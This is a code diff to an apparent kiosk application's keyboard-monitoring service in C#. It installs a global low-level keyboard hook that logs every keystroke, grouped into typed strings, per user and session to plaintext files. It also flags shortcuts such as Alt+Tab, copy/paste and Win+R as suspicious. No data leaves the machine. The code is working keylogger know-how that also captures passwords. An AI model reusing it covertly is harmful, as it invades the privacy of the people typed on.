@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -16,9 +17,21 @@ namespace ApacKiosk.Services
         private Thread _thread;
         private volatile bool _isRunning;
         private int? _currentUserId;
+        private string _currentUsername;
+        private string _sessionTimestamp;
+        private string _keylogDir;
         private readonly StringBuilder _keyBuffer = new StringBuilder();
+        private readonly StringBuilder _suspiciousBuffer = new StringBuilder();
         private string _currentLogFile;
+        private string _currentSuspiciousFile;
         private DateTime _currentLogDate;
+
+        private readonly StringBuilder _charGroup = new StringBuilder();
+        private DateTime _groupFirstTime;
+        private DateTime _groupLastTime;
+        private readonly object _groupLock = new object();
+        private System.Threading.Timer _flushTimer;
+        private const int GROUP_TIMEOUT_MS = 2000;
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
@@ -33,11 +46,28 @@ namespace ApacKiosk.Services
             _proc = HookCallback;
         }
 
-        public void SetCurrentUser(int? userId)
+        public void SetSessionInfo(int userId, string username, string sessionTimestamp)
         {
             FlushBuffer();
+            FlushSuspiciousBuffer();
+            _currentUserId = userId;
+            _currentUsername = SanitizeName(username);
+            _sessionTimestamp = sessionTimestamp;
+            _currentLogDate = DateTime.MinValue;
+            _currentLogFile = null;
+            _currentSuspiciousFile = null;
+            EnsureLogFile();
+            EnsureSuspiciousFile();
+        }
+
+        public void SetCurrentUser(int? userId)
+        {
+            FlushCharGroup();
+            FlushBuffer();
+            FlushSuspiciousBuffer();
             _currentUserId = userId;
             EnsureLogFile();
+            EnsureSuspiciousFile();
         }
 
         public void Start()
@@ -45,6 +75,8 @@ namespace ApacKiosk.Services
             if (_isRunning) return;
             _isRunning = true;
             EnsureLogFile();
+            EnsureSuspiciousFile();
+            _flushTimer = new System.Threading.Timer(OnFlushTimer, null, GROUP_TIMEOUT_MS, GROUP_TIMEOUT_MS);
             _thread = new Thread(RunHookLoop)
             {
                 IsBackground = true,
@@ -57,12 +89,16 @@ namespace ApacKiosk.Services
         public void Stop()
         {
             _isRunning = false;
+            _flushTimer?.Dispose();
+            _flushTimer = null;
             if (_hookId != IntPtr.Zero)
             {
                 UnhookWindowsHookEx(_hookId);
                 _hookId = IntPtr.Zero;
             }
+            FlushCharGroup();
             FlushBuffer();
+            FlushSuspiciousBuffer();
             _thread?.Join(3000);
         }
 
@@ -72,39 +108,102 @@ namespace ApacKiosk.Services
             System.Windows.Forms.Application.Run();
         }
 
+        private string BuildSessionDir()
+        {
+            var userLabel = _currentUsername ?? "system";
+            var dateLabel = _sessionTimestamp ?? DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
+            return Path.Combine(_config.BaseLogPath, userLabel, dateLabel, "teclado");
+        }
+
         private void EnsureLogFile()
         {
-            var now = DateTime.Now;
-            bool createNew = false;
-
-            if (_config.KeyloggerFileMode == "session")
-                createNew = true;
-            else if (_config.KeyloggerFileMode == "daily" && _currentLogDate.Date != now.Date)
-                createNew = true;
-            else if (_currentLogFile == null)
-                createNew = true;
-
-            if (createNew)
+            if (_currentLogFile == null)
             {
-                FlushBuffer();
-                var dir = _config.KeyloggerPath;
-                Directory.CreateDirectory(dir);
-                var dateStr = now.ToString("yyyyMMdd");
-                var userLabel = _currentUserId?.ToString() ?? "system";
-                _currentLogDate = now;
-                _currentLogFile = Path.Combine(dir, $"keylog_{dateStr}_{userLabel}.txt");
+                _keylogDir = BuildSessionDir();
+                Directory.CreateDirectory(_keylogDir);
+                _currentLogDate = DateTime.Now;
+                _currentLogFile = Path.Combine(_keylogDir, "keylog.txt");
             }
+        }
+
+        private void EnsureSuspiciousFile()
+        {
+            if (_currentSuspiciousFile == null)
+            {
+                var dir = BuildSessionDir();
+                Directory.CreateDirectory(dir);
+                _currentSuspiciousFile = Path.Combine(dir, "suspicious_activity.txt");
+            }
+        }
+
+        private void OnFlushTimer(object state)
+        {
+            lock (_groupLock)
+            {
+                if (_charGroup.Length > 0 && (DateTime.Now - _groupLastTime).TotalMilliseconds >= GROUP_TIMEOUT_MS)
+                    FlushCharGroup();
+            }
+        }
+
+        private void FlushCharGroup()
+        {
+            lock (_groupLock)
+            {
+                if (_charGroup.Length == 0) return;
+
+                var userLabel = _currentUserId?.ToString() ?? "system";
+                var startTs = _groupFirstTime.ToString("yyyy-MM-dd HH:mm:ss");
+                var endTs = _groupLastTime.ToString("yyyy-MM-dd HH:mm:ss");
+                var count = _charGroup.Length;
+
+                if (startTs == endTs)
+                    _keyBuffer.AppendLine($"[{startTs}] {userLabel}: \"{_charGroup}\" ({count} teclas)");
+                else
+                    _keyBuffer.AppendLine($"[{startTs} - {endTs}] {userLabel}: \"{_charGroup}\" ({count} teclas)");
+
+                _charGroup.Clear();
+                if (_keyBuffer.Length > 4096)
+                    FlushBuffer();
+            }
+        }
+
+        private void AppendSuspicious(string code, string description)
+        {
+            var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+            var userLabel = _currentUserId?.ToString() ?? "system";
+            _suspiciousBuffer.AppendLine($"[{timestamp}] {userLabel} | {code} | {description}");
+            if (_suspiciousBuffer.Length > 2048)
+                FlushSuspiciousBuffer();
         }
 
         private void FlushBuffer()
         {
-            if (_keyBuffer.Length == 0 || _currentLogFile == null) return;
+            if (_keyBuffer.Length == 0) return;
             try
             {
-                File.AppendAllText(_currentLogFile, _keyBuffer.ToString());
+                if (_currentLogFile != null)
+                    File.AppendAllText(_currentLogFile, _keyBuffer.ToString());
                 _keyBuffer.Clear();
             }
             catch { }
+        }
+
+        private void FlushSuspiciousBuffer()
+        {
+            if (_suspiciousBuffer.Length == 0) return;
+            try
+            {
+                if (_currentSuspiciousFile != null)
+                    File.AppendAllText(_currentSuspiciousFile, _suspiciousBuffer.ToString());
+                _suspiciousBuffer.Clear();
+            }
+            catch { }
+        }
+
+        private static string SanitizeName(string name)
+        {
+            if (string.IsNullOrEmpty(name)) return "anon";
+            return string.Join("_", name.Split(Path.GetInvalidFileNameChars()));
         }
 
         private IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -124,19 +223,181 @@ namespace ApacKiosk.Services
                 try
                 {
                     EnsureLogFile();
+                    EnsureSuspiciousFile();
                     int vkCode = Marshal.ReadInt32(lParam);
-                    var key = MapVirtualKey(vkCode);
-                    var userLabel = _currentUserId?.ToString() ?? "system";
-                    var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    var line = $"[{timestamp}] {userLabel}: {key}\r\n";
-                    _keyBuffer.Append(line);
+                    var isSpecial = IsSpecialKey(vkCode);
+                    var modifiers = GetModifiers();
+                    var hasSuspiciousMod = HasSuspiciousModifiers(modifiers);
 
-                    if (_keyBuffer.Length > 4096)
-                        FlushBuffer();
+                    if (hasSuspiciousMod)
+                        DetectSuspicious(vkCode, modifiers);
+
+                    if (isSpecial || hasSuspiciousMod)
+                    {
+                        FlushCharGroup();
+
+                        var userLabel = _currentUserId?.ToString() ?? "system";
+                        var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                        var key = MapVirtualKey(vkCode);
+                        _keyBuffer.AppendLine($"[{timestamp}] {userLabel}: {key}");
+
+                        if (_keyBuffer.Length > 4096)
+                            FlushBuffer();
+                    }
+                    else
+                    {
+                        lock (_groupLock)
+                        {
+                            var now = DateTime.Now;
+                            if (_charGroup.Length == 0)
+                            {
+                                _groupFirstTime = now;
+                                _groupLastTime = now;
+                            }
+                            else if ((now - _groupLastTime).TotalMilliseconds >= GROUP_TIMEOUT_MS)
+                            {
+                                var saved = _charGroup.ToString();
+                                _charGroup.Clear();
+                                FlushCharGroupInline(saved, _groupFirstTime, _groupLastTime);
+                                _groupFirstTime = now;
+                                _groupLastTime = now;
+                            }
+                            else
+                            {
+                                _groupLastTime = now;
+                            }
+
+                            var ch = VkToChar(vkCode);
+                            _charGroup.Append(ch);
+                        }
+                    }
                 }
                 catch { }
             }
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
+        }
+
+        private void FlushCharGroupInline(string saved, DateTime firstTime, DateTime lastTime)
+        {
+            var userLabel = _currentUserId?.ToString() ?? "system";
+            var startTs = firstTime.ToString("yyyy-MM-dd HH:mm:ss");
+            var endTs = lastTime.ToString("yyyy-MM-dd HH:mm:ss");
+            var count = saved.Length;
+            if (startTs == endTs)
+                _keyBuffer.AppendLine($"[{startTs}] {userLabel}: \"{saved}\" ({count} teclas)");
+            else
+                _keyBuffer.AppendLine($"[{startTs} - {endTs}] {userLabel}: \"{saved}\" ({count} teclas)");
+            if (_keyBuffer.Length > 4096)
+                FlushBuffer();
+        }
+
+        private static bool IsSpecialKey(int vkCode)
+        {
+            return vkCode switch
+            {
+                0x08 => true, 0x09 => true, 0x0D => true, 0x1B => true, 0x20 => true,
+                0x21 => true, 0x22 => true, 0x23 => true, 0x24 => true,
+                0x25 => true, 0x26 => true, 0x27 => true, 0x28 => true,
+                0x2D => true, 0x2E => true,
+                >= 0x70 and <= 0x7B => true,
+                _ => false
+            };
+        }
+
+        private static char VkToChar(int vkCode)
+        {
+            var shift = (GetKeyState(0x10) & 0x8000) != 0;
+            var caps = (GetKeyState(0x14) & 0x0001) != 0;
+            var capsEffect = shift ^ caps;
+
+            if (vkCode >= 0x30 && vkCode <= 0x39)
+            {
+                if (shift) return ")!@#$%^&*("[vkCode - 0x30];
+                return (char)vkCode;
+            }
+            if (vkCode >= 0x41 && vkCode <= 0x5A)
+            {
+                return capsEffect ? (char)vkCode : (char)(vkCode + 32);
+            }
+            if (vkCode >= 0x60 && vkCode <= 0x6F)
+                return (char)(vkCode - 0x30);
+            if (vkCode == 0xBA) return shift ? ':' : ';';
+            if (vkCode == 0xBB) return shift ? '+' : '=';
+            if (vkCode == 0xBC) return shift ? '<' : ',';
+            if (vkCode == 0xBD) return shift ? '_' : '-';
+            if (vkCode == 0xBE) return shift ? '>' : '.';
+            if (vkCode == 0xBF) return shift ? '?' : '/';
+            if (vkCode == 0xC0) return shift ? '~' : '`';
+            if (vkCode == 0xDB) return shift ? '{' : '[';
+            if (vkCode == 0xDC) return shift ? '|' : '\\';
+            if (vkCode == 0xDD) return shift ? '}' : ']';
+            if (vkCode == 0xDE) return shift ? '"' : '\'';
+            if (vkCode == 0xDF) return '\0';
+            if (vkCode == 0xE2) return shift ? '>' : '<';
+
+            if (vkCode >= 0x20 && vkCode <= 0x7E)
+                return (char)vkCode;
+
+            return (char)vkCode;
+        }
+
+        private class ModState
+        {
+            public bool Ctrl, Alt, Shift, Win;
+        }
+
+        private static ModState GetModifiers()
+        {
+            return new ModState
+            {
+                Ctrl = (GetKeyState(0x11) & 0x8000) != 0,
+                Shift = (GetKeyState(0x10) & 0x8000) != 0,
+                Alt = (GetKeyState(0x12) & 0x8000) != 0,
+                Win = (GetKeyState(0x5B) & 0x8000) != 0 || (GetKeyState(0x5C) & 0x8000) != 0
+            };
+        }
+
+        private static bool HasSuspiciousModifiers(ModState m)
+        {
+            return m.Ctrl || m.Alt || m.Win;
+        }
+
+        private void DetectSuspicious(int vkCode, ModState m)
+        {
+            if (m.Alt && vkCode == 0x73)
+                AppendSuspicious("SUS_ALTF4", "Alt+F4 detectado");
+            else if (m.Alt && vkCode == 0x09)
+                AppendSuspicious("SUS_ALTTAB", "Alt+Tab detectado");
+            else if (m.Ctrl && vkCode == 0x1B)
+                AppendSuspicious("SUS_CTRLESC", "Ctrl+Esc detectado");
+            else if (m.Ctrl && vkCode == 0x2E)
+                AppendSuspicious("SUS_CTRL_ALT_DEL", "Ctrl+Alt+Del detectado");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x43)
+                AppendSuspicious("SUS_CLIPBOARD_COPY", "Ctrl+C (copiar)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x58)
+                AppendSuspicious("SUS_CLIPBOARD_CUT", "Ctrl+X (recortar)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x56)
+                AppendSuspicious("SUS_CLIPBOARD_PASTE", "Ctrl+V (colar)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x53)
+                AppendSuspicious("SUS_SAVE", "Ctrl+S (salvar)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x50)
+                AppendSuspicious("SUS_PRINT", "Ctrl+P (imprimir)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x5A)
+                AppendSuspicious("SUS_UNDO", "Ctrl+Z (desfazer)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x4E)
+                AppendSuspicious("SUS_NEW_WINDOW", "Ctrl+N (nova janela)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x54)
+                AppendSuspicious("SUS_NEW_TAB", "Ctrl+T (nova aba)");
+            else if (m.Ctrl && !m.Alt && !m.Win && vkCode == 0x57)
+                AppendSuspicious("SUS_CLOSE_TAB", "Ctrl+W (fechar aba)");
+            else if (m.Win && vkCode == 0x4C)
+                AppendSuspicious("SUS_WINLOCK", "Win+L (bloquear)");
+            else if (m.Win && vkCode == 0x52)
+                AppendSuspicious("SUS_WINRUN", "Win+R (executar)");
+            else if (m.Win)
+                AppendSuspicious("SUS_WINKEY", $"Tecla Win + VK{vkCode:X2}");
+            else if (m.Ctrl && m.Alt)
+                AppendSuspicious("SUS_CTRL_ALT", $"Ctrl+Alt + VK{vkCode:X2}");
         }
 
         private static string MapVirtualKey(int vkCode)
